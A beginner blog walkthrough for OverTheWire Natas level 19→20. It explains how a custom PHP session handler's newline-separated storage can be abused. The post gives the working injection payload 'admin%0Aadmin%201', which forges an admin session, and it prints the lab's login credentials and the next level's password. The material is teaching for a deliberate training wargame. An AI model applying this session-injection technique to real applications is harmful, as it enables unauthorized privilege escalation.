---
layout: post-with-comments
title: "OverTheWire Natas Level 19 → 20 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-19-to-20/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, session, newline-injection]
description: "A step by step tutorial for OverTheWire Natas Level 19 → 20!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>


<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-18-to-19/' | relative_url }}">← Previous: Level 18 → 19</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas20.html" target="_blank" rel="noopener">
      Official (Level 20) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-20-to-21/' | relative_url }}">
      Next: Level 20 → 21 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
Credentials: **natas19:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**

```bash
# Using curl (optional):
curl -u natas19:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw 
  http://natas20.natas.labs.overthewire.org/
```

![homepage]({{ '/assets/images/natas/level-19-to-20/homepage.jpg' | relative_url }})

---

## Task

This level uses a **custom session handler** that stores session data in flat files.
Our goal: exploit how it writes values to inject `admin 1` into the session.

---

## A little bit of Theory

From the code:

```php
foreach($_SESSION as $key => $value) {
    $data .= "$key $value\n";
}
```

* Each key/value is written to the session file with a **newline separator**.
* When the file is reloaded, those lines are split back into `$_SESSION` variables.

This allows us to smuggle in arbitrary session values using **newline injection**.

The condition for credentials:

```php
if ($_SESSION["admin"] == 1) {
   // print password
}
```

So if we can force a line `admin 1` into the session, we escalate to admin.

---

## Solution

### Step 1: Turn on debug

Visit:

```
http://natas20.natas.labs.overthewire.org/index.php?debug
```

Enter a name like `natas`, submit → you’ll see debug output showing how the session file is written.


![debug]({{ '/assets/images/natas/level-19-to-20/debug.jpg' | relative_url }})

---

### Step 2: Inject a newline

We send a specially crafted `name` parameter:

```
admin%0Aadmin%201
```

* `%0A` → newline
* `%20` → space

So the full URL:

```
http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201
```

Now the session file looks like:

```
name admin
admin 1
```

When read, this sets `$_SESSION["admin"] = 1`.

---

### Step 3: Profit 🎉

Reload the page → you’ll see the credentials for **natas21**.

![owned]({{ '/assets/images/natas/level-19-to-20/owned.jpg' | relative_url }})

---

## Password

```
BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```

---

## Troubleshooting

* **Still not admin?** → Double-check the encoding (`%0A` for newline, `%20` for space).
* **No debug output?** → Make sure you added `?debug` to the URL.
* **Session not updating?** → Refresh or clear cookies to force reload.

---

**Boom 🎉** You just exploited a **newline injection in custom session storage** to escalate to admin and recover the next password.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
